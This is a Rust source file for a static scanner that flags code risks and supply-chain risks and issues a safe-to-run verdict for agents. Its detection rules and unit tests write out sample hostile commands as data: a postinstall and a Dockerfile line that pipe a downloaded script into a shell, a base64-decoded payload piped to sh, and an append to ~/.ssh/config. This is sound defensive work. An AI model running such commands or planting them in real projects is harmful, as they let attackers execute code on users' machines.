use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::config::ReportLanguage;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn label_for(self, language: ReportLanguage) -> &'static str {
        if language == ReportLanguage::Zh {
            return match self {
                Severity::High => "\u{9ad8}",
                Severity::Medium => "\u{4e2d}",
                Severity::Low => "\u{4f4e}",
            };
        }
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MEDIUM",
            Severity::Low => "LOW",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RiskFinding {
    pub severity: Severity,
    pub path: String,
    pub line: Option<usize>,
    pub rule: String,
    pub title: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct AgentGateCoverage {
    pub candidate_files: usize,
    pub dehydrated_files: usize,
    pub read_failed: usize,
    pub unsupported_files: usize,
    pub parse_failed: usize,
    pub serialization_failed: usize,
    pub record_truncated: usize,
}

pub struct AgentGateReport {
    pub markdown: String,
    pub safe_to_agent_run: bool,
}

#[derive(Debug, Deserialize)]
struct AstRow {
    path: String,
    #[serde(default)]
    external: Vec<String>,
    #[serde(default)]
    calls: Vec<String>,
    #[serde(default)]
    locations: Vec<AstLocationRow>,
}

#[derive(Debug, Deserialize)]
struct AstLocationRow {
    kind: String,
    line: usize,
    text: String,
}

struct RowRiskContext {
    package_json: bool,
    python_setup: bool,
    build_script: bool,
    github_workflow: bool,
    workflow_has_secret: bool,
}

impl RowRiskContext {
    fn new(row: &AstRow) -> Self {
        Self {
            package_json: is_package_json_path(&row.path),
            python_setup: is_python_setup_path(&row.path),
            build_script: is_build_script_path(&row.path),
            github_workflow: is_github_workflow_path(&row.path),
            workflow_has_secret: row
                .locations
                .iter()
                .any(|loc| contains_workflow_secret(&loc.text)),
        }
    }
}

pub fn findings_json_from_seed(seed: &str) -> String {
    let findings = findings_from_seed(seed);
    serde_json::to_string_pretty(&findings).unwrap_or_else(|_| "[]".to_string())
}

pub fn markdown_from_seed_with_language(seed: &str, language: ReportLanguage) -> String {
    render_markdown_with_language(&findings_from_seed(seed), language)
}

pub fn markdown_from_findings_json_with_language(
    input: &str,
    language: ReportLanguage,
) -> Option<String> {
    let findings: Vec<RiskFinding> = serde_json::from_str(input).ok()?;
    Some(render_markdown_with_language(&findings, language))
}

pub fn agent_gate_from_seed(seed: &str, coverage: AgentGateCoverage) -> AgentGateReport {
    render_agent_gate(&findings_from_seed(seed), coverage)
}

pub fn findings_from_seed(seed: &str) -> Vec<RiskFinding> {
    let mut out = Vec::new();
    let mut seen = BTreeSet::new();

    for line in seed.lines() {
        let Ok(row) = serde_json::from_str::<AstRow>(line) else {
            continue;
        };
        let ctx = RowRiskContext::new(&row);

        if row.locations.is_empty() {
            for call in row.calls {
                push_call_risk(&mut out, &mut seen, &row.path, None, &call);
                push_supply_chain_risks(&mut out, &mut seen, &row.path, None, &call, &ctx);
            }
        }

        for loc in &row.locations {
            push_supply_chain_risks(
                &mut out,
                &mut seen,
                &row.path,
                Some(loc.line),
                &loc.text,
                &ctx,
            );
            match loc.kind.as_str() {
                "call" => push_call_risk(&mut out, &mut seen, &row.path, Some(loc.line), &loc.text),
                "signature" => {
                    if loc.text.trim_start().starts_with("unsafe ") {
                        push_unique(
                            &mut out,
                            &mut seen,
                            RiskFinding {
                                severity: Severity::Medium,
                                path: row.path.clone(),
                                line: Some(loc.line),
                                rule: "unsafe-surface".to_string(),
                                title: "Unsafe surface requires manual audit".to_string(),
                                evidence: loc.text.clone(),
                            },
                        );
                    }
                }
                "import" if is_external_text(&loc.text) => push_unique(
                    &mut out,
                    &mut seen,
                    RiskFinding {
                        severity: Severity::Low,
                        path: row.path.clone(),
                        line: Some(loc.line),
                        rule: "external-blackbox".to_string(),
                        title: "Cross-boundary reference left as black box".to_string(),
                        evidence: loc.text.clone(),
                    },
                ),
                _ => {}
            }
        }

        for ext in row.external {
            let text = ext.trim_start_matches("[EXTERNAL_BLACKBOX] ").to_string();
            push_unique(
                &mut out,
                &mut seen,
                RiskFinding {
                    severity: Severity::Low,
                    path: row.path.clone(),
                    line: None,
                    rule: "external-blackbox".to_string(),
                    title: "Cross-boundary reference left as black box".to_string(),
                    evidence: text,
                },
            );
        }
    }

    out.sort_by(|a, b| {
        severity_rank(a.severity)
            .cmp(&severity_rank(b.severity))
            .then_with(|| a.path.cmp(&b.path))
            .then_with(|| a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(&b.rule))
    });
    out
}

pub fn render_markdown_with_language(findings: &[RiskFinding], language: ReportLanguage) -> String {
    let mut s = match language {
        ReportLanguage::En => String::from("# Risk Ledger\n\n"),
        ReportLanguage::Zh => String::from("# \u{98ce}\u{9669}\u{8d26}\u{672c}\n\n"),
    };
    if findings.is_empty() {
        s.push_str(match language {
            ReportLanguage::En => "No deterministic risks found in the analyzed input. Review coverage, runtime behavior, configuration, and cross-module semantics manually.\n",
            ReportLanguage::Zh => "\u{672a}\u{5728}\u{5206}\u{6790}\u{8f93}\u{5165}\u{4e2d}\u{53d1}\u{73b0}\u{786e}\u{5b9a}\u{6027}\u{98ce}\u{9669}\u{3002}\u{8bf7}\u{4eba}\u{5de5}\u{590d}\u{6838}\u{8986}\u{76d6}\u{7387}\u{3001}\u{8fd0}\u{884c}\u{65f6}\u{884c}\u{4e3a}\u{3001}\u{914d}\u{7f6e}\u{548c}\u{8de8}\u{6a21}\u{5757}\u{8bed}\u{4e49}\u{3002}\n",
        });
        return s;
    }

    s.push_str(match language {
        ReportLanguage::En => "| Severity | Location | Rule | Finding |\n",
        ReportLanguage::Zh => {
            "|\u{4e25}\u{91cd}\u{6027}|\u{4f4d}\u{7f6e}|\u{89c4}\u{5219}|\u{53d1}\u{73b0}|\n"
        }
    });
    s.push_str("|---|---|---|---|\n");
    for f in findings {
        let location = match f.line {
            Some(line) => format!("{}:{line}", f.path),
            None => f.path.clone(),
        };
        s.push_str(&format!(
            "| {} | `{}` | `{}` | {}: `{}` |\n",
            f.severity.label_for(language),
            escape_cell(&location),
            escape_cell(&f.rule),
            escape_cell(title_for_language(&f.title, language)),
            escape_cell(&f.evidence),
        ));
    }
    s
}

fn title_for_language(title: &str, language: ReportLanguage) -> &str {
    if language != ReportLanguage::Zh {
        return title;
    }
    match title {
        "Unchecked unwrap/expect can panic" => {
            "\u{672a}\u{68c0}\u{67e5}\u{7684} unwrap/expect \u{53ef}\u{80fd} panic"
        }
        "Explicit panic path" => "\u{663e}\u{5f0f} panic \u{8def}\u{5f84}",
        "Subprocess boundary requires timeout and input control" => {
            "\u{5b50}\u{8fdb}\u{7a0b}\u{8fb9}\u{754c}\u{9700}\u{8981}\u{8d85}\u{65f6}\u{548c}\u{8f93}\u{5165}\u{63a7}\u{5236}"
        }
        "Unsafe surface requires manual audit" => {
            "unsafe \u{8868}\u{9762}\u{9700}\u{8981}\u{4eba}\u{5de5}\u{5ba1}\u{8ba1}"
        }
        "Cross-boundary reference left as black box" => {
            "\u{8de8}\u{8fb9}\u{754c}\u{5f15}\u{7528}\u{4ecd}\u{662f}\u{9ed1}\u{76d2}"
        }
        _ => title,
    }
}

fn render_agent_gate(findings: &[RiskFinding], coverage: AgentGateCoverage) -> AgentGateReport {
    let incomplete = gate_incomplete_reasons(coverage);
    let verdict = if !incomplete.is_empty() {
        "INCOMPLETE"
    } else if findings.iter().any(|f| f.severity == Severity::High) {
        "REJECT"
    } else if findings.is_empty() {
        "ACCEPT"
    } else {
        "CAUTION"
    };
    let safe_to_agent_run = verdict == "ACCEPT";
    let mut s = format!("VERDICT: {verdict}\n");

    s.push_str("WHY:\n");
    for line in gate_why_lines(findings, &incomplete) {
        s.push_str("- ");
        s.push_str(&line);
        s.push('\n');
    }

    s.push_str("BLOCKERS:\n");
    let blockers = gate_blocker_lines(findings, &incomplete);
    if blockers.is_empty() {
        s.push_str("- none\n");
    } else {
        for line in blockers {
            s.push_str("- ");
            s.push_str(&line);
            s.push('\n');
        }
    }

    s.push_str(&format!(
        "SAFE_TO_AGENT_RUN: {}\n\n",
        if safe_to_agent_run { "yes" } else { "no" }
    ));
    s.push_str("COVERAGE:\n");
    s.push_str(&format!(
        "- candidate_files: {}\n- dehydrated_files: {}\n- unsupported_files: {}\n- read_failed: {}\n- parse_failed: {}\n- serialization_failed: {}\n- record_truncated: {}\n",
        coverage.candidate_files,
        coverage.dehydrated_files,
        coverage.unsupported_files,
        coverage.read_failed,
        coverage.parse_failed,
        coverage.serialization_failed,
        coverage.record_truncated,
    ));

    AgentGateReport {
        markdown: s,
        safe_to_agent_run,
    }
}

fn gate_incomplete_reasons(coverage: AgentGateCoverage) -> Vec<String> {
    let mut reasons = Vec::new();
    if coverage.read_failed > 0 {
        reasons.push(format!("read_failed={}", coverage.read_failed));
    }
    if coverage.parse_failed > 0 {
        reasons.push(format!("parse_failed={}", coverage.parse_failed));
    }
    if coverage.serialization_failed > 0 {
        reasons.push(format!(
            "serialization_failed={}",
            coverage.serialization_failed
        ));
    }
    if coverage.record_truncated > 0 {
        reasons.push(format!("record_truncated={}", coverage.record_truncated));
    }
    if coverage.candidate_files > 0 && coverage.dehydrated_files == 0 {
        reasons.push("no_supported_files_dehydrated".to_string());
    }
    reasons
}

fn gate_why_lines(findings: &[RiskFinding], incomplete: &[String]) -> Vec<String> {
    if !incomplete.is_empty() {
        return incomplete
            .iter()
            .take(3)
            .map(|reason| format!("Input coverage is incomplete: {reason}"))
            .collect();
    }
    if findings.is_empty() {
        return vec![
            "No deterministic risks found in the analyzed input.".to_string(),
            "This gate does not replace manual review of runtime behavior.".to_string(),
        ];
    }
    findings
        .iter()
        .take(3)
        .map(|finding| {
            format!(
                "{} {}",
                finding.severity.label_for(ReportLanguage::En),
                finding_summary(finding)
            )
        })
        .collect()
}

fn gate_blocker_lines(findings: &[RiskFinding], incomplete: &[String]) -> Vec<String> {
    if !incomplete.is_empty() {
        return incomplete
            .iter()
            .map(|reason| format!("coverage requires review: {reason}"))
            .collect();
    }
    findings
        .iter()
        .filter(|finding| finding.severity != Severity::Low)
        .take(10)
        .map(finding_summary)
        .collect()
}

fn finding_summary(finding: &RiskFinding) -> String {
    let location = match finding.line {
        Some(line) => format!("{}:{line}", finding.path),
        None => finding.path.clone(),
    };
    format!(
        "{} [{}]: {} ({})",
        location, finding.rule, finding.title, finding.evidence
    )
}

fn push_call_risk(
    out: &mut Vec<RiskFinding>,
    seen: &mut BTreeSet<String>,
    path: &str,
    line: Option<usize>,
    call: &str,
) {
    let rule = if is_panic_edge_call(call) {
        Some((
            "panic-edge",
            Severity::High,
            "Unchecked unwrap/expect can panic",
        ))
    } else if call.contains("panic") && call.contains('!') {
        Some(("explicit-panic", Severity::High, "Explicit panic path"))
    } else if call.contains("std::process::Command") {
        Some((
            "subprocess-boundary",
            Severity::Medium,
            "Subprocess boundary requires timeout and input control",
        ))
    } else {
        None
    };

    if let Some((rule, severity, title)) = rule {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity,
                path: path.to_string(),
                line,
                rule: rule.to_string(),
                title: title.to_string(),
                evidence: call.to_string(),
            },
        );
    }
}

fn push_supply_chain_risks(
    out: &mut Vec<RiskFinding>,
    seen: &mut BTreeSet<String>,
    path: &str,
    line: Option<usize>,
    text: &str,
    ctx: &RowRiskContext,
) {
    if ctx.package_json && is_npm_lifecycle_script(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "npm-lifecycle-script".to_string(),
                title: "NPM lifecycle script executes during install".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.build_script && looks_like_subprocess_or_shell(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "rust-build-script-command".to_string(),
                title: "Rust build script invokes a command boundary".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.python_setup && looks_like_python_setup_command(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "python-setup-command".to_string(),
                title: "Python setup script invokes a command boundary".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_download_execute(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "download-execute".to_string(),
                title: "Downloaded content is executed or made executable".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_home_or_ssh_write(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "install-home-write".to_string(),
                title: "Install path writes to HOME or SSH configuration".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_base64_execute(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::High,
                path: path.to_string(),
                line,
                rule: "base64-execute".to_string(),
                title: "Base64-decoded content flows into execution".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if looks_like_dynamic_shell_eval(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "dynamic-shell-eval".to_string(),
                title: "Dynamic shell evaluation requires manual review".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow
        && (contains_workflow_secret(text) || (ctx.workflow_has_secret && is_run_line(text)))
    {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "workflow-secret-shell".to_string(),
                title: "GitHub Actions shell path is coupled to secrets".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }

    if ctx.github_workflow && is_unpinned_action_use(text) {
        push_unique(
            out,
            seen,
            RiskFinding {
                severity: Severity::Medium,
                path: path.to_string(),
                line,
                rule: "unpinned-github-action".to_string(),
                title: "GitHub Action reference is not pinned to a commit SHA".to_string(),
                evidence: sanitize_evidence(text),
            },
        );
    }
}

fn is_panic_edge_call(call: &str) -> bool {
    let unwrap_like = call.contains(".unwrap") && !call.contains(".unwrap_or");
    unwrap_like || call.contains(".expect")
}

fn is_package_json_path(path: &str) -> bool {
    normalized_path(path).ends_with("/package.json") || normalized_path(path) == "package.json"
}

fn is_python_setup_path(path: &str) -> bool {
    normalized_path(path).ends_with("/setup.py") || normalized_path(path) == "setup.py"
}

fn is_build_script_path(path: &str) -> bool {
    normalized_path(path).ends_with("/build.rs") || normalized_path(path) == "build.rs"
}

fn is_github_workflow_path(path: &str) -> bool {
    let path = normalized_path(path);
    path.contains("/.github/workflows/") || path.starts_with(".github/workflows/")
}

fn normalized_path(path: &str) -> String {
    path.replace('\\', "/")
}

fn is_npm_lifecycle_script(text: &str) -> bool {
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "prepack",
        "postpack",
    ]
    .iter()
    .any(|key| text.contains(&format!("\"{key}\"")) && text.contains(':'))
}

fn looks_like_subprocess_or_shell(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("std::process::command")
        || lower.contains("command::new")
        || lower.contains("process::command")
        || lower.contains("shell")
        || lower.contains("cmd")
}

fn looks_like_python_setup_command(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("os.system")
        || lower.contains("os.popen")
        || lower.contains("subprocess.")
        || lower.contains("subprocess::")
}

fn looks_like_download_execute(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let downloads = lower.contains("curl") || lower.contains("wget");
    downloads
        && (lower.contains("| sh")
            || lower.contains("|sh")
            || lower.contains("| bash")
            || lower.contains("|bash")
            || lower.contains("bash -c")
            || lower.contains("sh -c")
            || lower.contains("chmod +x")
            || lower.contains("&& ./")
            || lower.contains("; ./"))
}

fn looks_like_home_or_ssh_write(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let home_or_ssh = lower.contains("~/.ssh")
        || lower.contains("$home/.ssh")
        || lower.contains("${home}/.ssh")
        || lower.contains("/.ssh/config")
        || lower.contains("/.ssh/authorized_keys");
    let write_op = lower.contains(">>")
        || lower.contains("> ")
        || lower.contains("tee ")
        || lower.contains("cat >")
        || lower.contains("install ")
        || lower.contains("chmod ");
    home_or_ssh && write_op
}

fn looks_like_base64_execute(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("base64")
        && (lower.contains("-d") || lower.contains("--decode"))
        && (lower.contains("| sh")
            || lower.contains("|sh")
            || lower.contains("| bash")
            || lower.contains("|bash")
            || lower.contains("bash -c")
            || lower.contains("sh -c")
            || lower.contains("eval"))
}

fn looks_like_dynamic_shell_eval(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("eval ") || lower.contains("eval(") || lower.contains("bash -c")
}

fn contains_workflow_secret(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("secrets.") || lower.contains("secrets[")
}

fn is_run_line(text: &str) -> bool {
    text.trim_start().starts_with("run:")
}

fn is_unpinned_action_use(text: &str) -> bool {
    let trimmed = text.trim_start();
    if !trimmed.starts_with("uses:") {
        return false;
    }
    let Some((_, reference)) = trimmed.split_once('@') else {
        return true;
    };
    !is_full_sha(reference.trim())
}

fn is_full_sha(reference: &str) -> bool {
    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
}

fn sanitize_evidence(text: &str) -> String {
    let mut evidence: String = text.chars().take(160).collect();
    for token in
        text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.'))
    {
        if token.to_ascii_lowercase().starts_with("secrets.") {
            evidence = evidence.replace(token, "secrets.<redacted>");
        }
    }
    evidence
}

fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, finding: RiskFinding) {
    let key = format!(
        "{}\0{:?}\0{}\0{}",
        finding.path, finding.line, finding.rule, finding.evidence
    );
    if seen.insert(key) {
        out.push(finding);
    }
}

fn is_external_text(text: &str) -> bool {
    text.contains("super::") || text.contains("crate::") || text.trim_start().starts_with("from .")
}

fn severity_rank(s: Severity) -> u8 {
    match s {
        Severity::High => 0,
        Severity::Medium => 1,
        Severity::Low => 2,
    }
}

fn escape_cell(s: &str) -> String {
    s.replace('|', "\\|").replace('\n', " ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_panic_edges_with_lines() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let findings = findings_from_seed(seed);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, Some(9));
        assert_eq!(findings[0].rule, "panic-edge");
    }

    #[test]
    fn ignores_fallback_unwrap_variants() {
        let seed = r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap_or"}]}"#;
        assert!(findings_from_seed(seed).is_empty());
    }

    #[test]
    fn renders_empty_report() {
        let md = render_markdown_with_language(&[], ReportLanguage::En);
        assert!(md.contains("No deterministic risks found"));
    }

    #[test]
    fn agent_gate_accepts_empty_clean_input() {
        let report = agent_gate_from_seed("", AgentGateCoverage::default());
        assert!(report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: ACCEPT"));
        assert!(report.markdown.contains("SAFE_TO_AGENT_RUN: yes"));
    }

    #[test]
    fn agent_gate_rejects_high_deterministic_findings() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let report = agent_gate_from_seed(
            seed,
            AgentGateCoverage {
                candidate_files: 1,
                dehydrated_files: 1,
                ..Default::default()
            },
        );

        assert!(!report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: REJECT"));
        assert!(report.markdown.contains("SAFE_TO_AGENT_RUN: no"));
        assert!(report.markdown.contains("src/a.rs:9 [panic-edge]"));
    }

    #[test]
    fn agent_gate_marks_incomplete_coverage() {
        let report = agent_gate_from_seed(
            "",
            AgentGateCoverage {
                candidate_files: 3,
                read_failed: 1,
                ..Default::default()
            },
        );

        assert!(!report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: INCOMPLETE"));
        assert!(
            report
                .markdown
                .contains("coverage requires review: read_failed=1")
        );
    }

    #[test]
    fn flags_npm_lifecycle_download_execute() {
        let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "npm-lifecycle-script" && f.severity == Severity::High && f.line == Some(4)
        }));
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
        );
    }

    #[test]
    fn flags_rust_build_script_command() {
        let seed = r#"{"path":"build.rs","locations":[{"kind":"call","line":7,"text":"std::process::Command::new"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "rust-build-script-command"
                && f.severity == Severity::High
                && f.line == Some(7)
        }));
    }

    #[test]
    fn flags_python_setup_command() {
        let seed = r#"{"path":"setup.py","locations":[{"kind":"call","line":5,"text":"subprocess.check_call"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "python-setup-command" && f.severity == Severity::High && f.line == Some(5)
        }));
    }

    #[test]
    fn flags_dockerfile_download_execute() {
        let seed = r#"{"path":"Dockerfile","locations":[{"kind":"call","line":3,"text":"RUN curl https://example.invalid/install.sh | bash"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "download-execute" && f.severity == Severity::High && f.line == Some(3)
        }));
    }

    #[test]
    fn flags_workflow_secret_shell_and_redacts_secret_name() {
        let seed = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":10,"text":"run: |"},{"kind":"signature","line":11,"text":"TOKEN: ${{ secrets.RELEASE_TOKEN }}"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "workflow-secret-shell"
                && f.severity == Severity::Medium
                && f.evidence.contains("secrets.<redacted>")
        }));
        assert!(
            !findings
                .iter()
                .any(|f| f.evidence.contains("RELEASE_TOKEN"))
        );
    }

    #[test]
    fn flags_unpinned_github_actions() {
        let seed = r#"{"path":".github/workflows/ci.yml","locations":[{"kind":"signature","line":7,"text":"uses: actions/checkout@v4"},{"kind":"signature","line":8,"text":"uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"}]}"#;
        let findings = findings_from_seed(seed);

        assert_eq!(
            findings
                .iter()
                .filter(|f| f.rule == "unpinned-github-action")
                .count(),
            1
        );
    }

    #[test]
    fn flags_base64_decode_execution() {
        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":2,"text":"echo d2hvYW1p | base64 -d | sh"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "base64-execute" && f.severity == Severity::High && f.line == Some(2)
        }));
    }

    #[test]
    fn flags_install_home_write() {
        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":3,"text":"echo Host example.invalid >> ~/.ssh/config"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "install-home-write" && f.severity == Severity::High && f.line == Some(3)
        }));
    }

    #[test]
    fn findings_json_round_trips_to_markdown() {
        let seed = r#"{"path":"src/a.rs","external":["[EXTERNAL_BLACKBOX] use crate::x;"]}"#;
        let json = findings_json_from_seed(seed);
        let md = markdown_from_findings_json_with_language(&json, ReportLanguage::En)
            .unwrap_or_default();
        assert!(md.contains("external-blackbox"));
    }

    #[test]
    fn renders_localized_markdown() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
        let md = markdown_from_seed_with_language(seed, ReportLanguage::Zh);
        assert!(md.contains("\u{98ce}\u{9669}\u{8d26}\u{672c}"));
        assert!(md.contains("\u{4e25}\u{91cd}\u{6027}"));
    }
}
